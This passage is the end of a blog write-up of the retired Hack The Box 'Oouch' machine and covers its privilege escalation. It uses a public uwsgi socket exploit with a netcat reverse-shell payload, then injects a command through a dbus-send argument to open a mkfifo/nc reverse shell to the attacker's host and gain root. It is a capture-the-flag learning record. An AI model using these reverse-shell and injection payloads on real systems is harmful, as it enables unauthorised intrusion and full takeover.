</pre></table></code></div></div><p>And no success.I m not privileged to run <code class="language-plaintext highlighter-rouge">dbus-send </code> on that interface.Bcz the file we have is owned by root itself.</p><h2 id="exploiting-uwsgi-service">Exploiting uwsgi service</h2><p>And the service <code class="language-plaintext highlighter-rouge">uwsgi</code> is running as <code class="language-plaintext highlighter-rouge">www-data</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>qtc@aeb4525789d8:/code<span class="nv">$ </span>ps <span class="nt">-aux</span>
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   5488  3116 ?        Ss   08:29   0:00 /bin/bash ./start.sh
root        14  0.0  0.0  15852  2924 ?        Ss   08:29   0:00 /usr/sbin/sshd
root        27  0.0  0.0  10476   844 ?        Ss   08:29   0:00 nginx: master process /usr/sbin/nginx
www-data    28  0.0  0.0  11264  3732 ?        S    08:29   0:00 nginx: worker process
www-data    29  0.0  0.0  11264  3732 ?        S    08:29   0:00 nginx: worker process
www-data    30  0.3  1.1  57492 46588 ?        S    08:29   0:02 uwsgi <span class="nt">--ini</span> uwsgi.ini <span class="nt">--chmod-sock</span><span class="o">=</span>666
www-data    31  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi <span class="nt">--ini</span> uwsgi.ini <span class="nt">--chmod-sock</span><span class="o">=</span>666
www-data    32  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi <span class="nt">--ini</span> uwsgi.ini <span class="nt">--chmod-sock</span><span class="o">=</span>666
www-data    33  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi <span class="nt">--ini</span> uwsgi.ini <span class="nt">--chmod-sock</span><span class="o">=</span>666
www-data    34  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi <span class="nt">--ini</span> uwsgi.ini <span class="nt">--chmod-sock</span><span class="o">=</span>666
www-data    35  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi <span class="nt">--ini</span> uwsgi.ini <span class="nt">--chmod-sock</span><span class="o">=</span>666
www-data    36  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi <span class="nt">--ini</span> uwsgi.ini <span class="nt">--chmod-sock</span><span class="o">=</span>666
www-data    37  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi <span class="nt">--ini</span> uwsgi.ini <span class="nt">--chmod-sock</span><span class="o">=</span>666
www-data    38  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi <span class="nt">--ini</span> uwsgi.ini <span class="nt">--chmod-sock</span><span class="o">=</span>666
www-data    39  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi <span class="nt">--ini</span> uwsgi.ini <span class="nt">--chmod-sock</span><span class="o">=</span>666
www-data    40  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi <span class="nt">--ini</span> uwsgi.ini <span class="nt">--chmod-sock</span><span class="o">=</span>666
</pre></table></code></div></div><p>And the version is</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>qtc@aeb4525789d8:/code<span class="nv">$ </span>uwsgi <span class="nt">--version</span>
2.0.17.1
qtc@aeb4525789d8:/code<span class="nv">$ </span>
</pre></table></code></div></div><p>I searched for possible exploits for the service and got success.Found this python script on the github.</p><p><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py">uwsgi_exp.py</a></p><p>The script needs some modifications on the line <code class="language-plaintext highlighter-rouge">18-19</code> with our requirements.</p><p>Chnaged the following</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>    <span class="k">if </span>sys.version_info[0] <span class="o">==</span> 3: import bytes
    s <span class="o">=</span> bytes.fromhex<span class="o">(</span>s<span class="o">)</span> <span class="k">if </span>sys.version_info[0] <span class="o">==</span> 3 <span class="k">else </span>s.decode<span class="o">(</span><span class="s1">'hex'</span><span class="o">)</span>
</pre></table></code></div></div><p>To</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>s <span class="o">=</span> bytes.fromhex<span class="o">(</span>s<span class="o">)</span>
</pre></table></code></div></div><p>There are two ways to run the exploit with <code class="language-plaintext highlighter-rouge">url</code> and <code class="language-plaintext highlighter-rouge">unix</code> mode The socket file is saved in <code class="language-plaintext highlighter-rouge">/tmp/uwsgi.socket</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>qtc@aeb4525789d8:/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 8
drwxrwxrwt 1 root     root     4096 Mar 26 08:29 <span class="nb">.</span>
drwxr-xr-x 1 root     root     4096 Feb 25 12:33 ..
srw-rw-rw- 1 www-data www-data    0 Mar 26 08:29 uwsgi.socket
</pre></table></code></div></div><p>Since we cant access docker from our attacking machine so we need to transfer netcat and exploit.py to oouch machine first and then move them to docker using <code class="language-plaintext highlighter-rouge">scp</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>qtc@oouch:~<span class="nv">$ </span>scp <span class="nt">-i</span> .ssh/id_rsa exploit.py  qtc@172.18.0.2:/tmp
exploit.py                                    100% 4333     5.4MB/s   00:00    
qtc@oouch:~<span class="nv">$ </span>scp <span class="nt">-i</span> .ssh/id_rsa nc  qtc@172.18.0.2:/tmp
nc                                            100%   35KB  22.2MB/s   00:00    
</pre></table></code></div></div><p>Now i can run the exploit.py and i opened another terminal and logged in as qtc on oouch and listening on port 1234.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>qtc@aeb4525789d8:/tmp<span class="nv">$ </span>python exploit.py <span class="nt">-m</span> unix <span class="nt">-u</span> /tmp/uwsgi.socket <span class="nt">-c</span> <span class="s2">"/tmp/nc -e /bin/bash 172.18.0.1 1234"</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span>Sending payload.

qtc@aeb4525789d8:/tmp
</pre></table></code></div></div><h2 id="shall-as-www-data">Shall as www-data</h2><p>Got connection back on my nc listener</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>qtc@oouch:~<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 1234
listening on <span class="o">[</span>any] 1234 ...
connect to <span class="o">[</span>172.18.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.18.0.2] 41652
<span class="nb">whoami
</span>www-data
</pre></table></code></div></div><h2 id="exploiting-dbus">Exploiting DBUS</h2><p>Now , If u run that <code class="language-plaintext highlighter-rouge">debus-send</code> command we used previously.We got root</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>www-daat@oouch:~<span class="nv">$ </span>dbus-send <span class="nt">--system</span> <span class="nt">--print-reply</span> <span class="nt">--dest</span><span class="o">=</span>htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block <span class="s2">"string:;rm /tmp/.0; mkfifo /tmp/.0; cat /tmp/.0 | /bin/bash -i 2&gt;&amp;1 | nc 10.10.15.135 2345 &gt;/tmp/.0;"</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>➜  prashant git:<span class="o">(</span>master<span class="o">)</span> ✗ nc <span class="nt">-nlvp</span> 2345
listening on <span class="o">[</span>any] 2345 ...
connect to <span class="o">[</span>10.10.15.135] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.177] 38152
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>2568<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@oouch:/root#
</pre></table></code></div></div><h1 id="got-roottxt">Got root.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>root@oouch:/root# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt
e23--------------------------fd7d
root@oouch:/root#
</pre></table></code></div></div><p>And we got root…..</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> on <a href="https://www.buymeacoffee.com/0xprashant">BuymeaCoffee</a></p><p>Thanks.</p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Details<tbody><tr><td>Attacking Oauth2<td><a href="https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/" target="_blank">https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/</a><tr><td>Uwsgi-exploit<td><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/oauth2/" class="post-tag no-text-decoration" >Oauth2</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a> <a href="/tags/uwsgi/" class="post-tag no-text-decoration" >uwsgi</a> <a href="/tags/dbus/" class="post-tag no-text-decoration" >dbus</a> <a href="/tags/ssrf/" class="post-tag no-text-decoration" >ssrf</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Oouch writeup - 0xPrashant&url=http://localhost:4000/posts/htb-oouch/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Oouch writeup - 0xPrashant&u=http://localhost:4000/posts/htb-oouch/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Oouch writeup - 0xPrashant&url=http://localhost:4000/posts/htb-oouch/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div><div class="card"> <a href="/posts/htb-cache/"><div class="card-body"> <span class="timeago small" > May 10 <i class="unloaded">2020-05-10T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Cache writeup</h3><div class="text-muted small"><p> I got the root flag first becasue i was able to pwn root wihout getting ash user credentials Introduction@cache:~$ Column Details Name Cache ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blunder/"><div class="card-body"> <span class="timeago small" > May 30 <i class="unloaded">2020-05-30T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blunder writeup</h3><div class="text-muted small"><p> Introduction@Blunder:~$ Column Details Name Blunder IP 10.10.10.191 Points 20 Os ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-book/" class="btn btn-outline-primary"><p>Hackthebox Book writeup</p></a> <a href="/posts/htb-traceback/" class="btn btn-outline-primary"><p>Hackthebox Traceback writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-oouch/'; this.page.identifier = '/posts/htb-oouch/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
